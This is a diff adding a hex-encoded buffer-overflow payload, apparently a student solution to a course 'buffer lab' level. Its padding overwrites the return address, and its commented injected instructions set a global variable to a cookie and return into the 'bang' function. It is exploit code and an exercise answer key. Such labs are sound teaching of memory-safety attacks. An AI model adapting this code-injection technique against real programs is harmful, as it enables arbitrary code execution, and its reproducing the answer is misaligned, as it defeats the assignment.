@@ -1,0 +1,12 @@
+01 02 03 04 05 06 07 08
+09 10 11 12 13 14 15 16
+17 18 19 20 21 22 23 24
+25 26 27 28 29 30 31 32
+33 34 35 36 37 38 39 40
+00 00 00 00
+/* 9d 8c 04 08 => bang address */
+68 39 68 55             /* next exploit code's address */
+c7 05 00 d1 04 08 f4 	/* movl   $0x33b0e3f4 (cookie),0x804d100 (&global_value) */
+e3 b0 33
+68 9d 8c 04 08       	/* push   $0x8048c9d (bang's address)*/
+c3                   	/* ret */
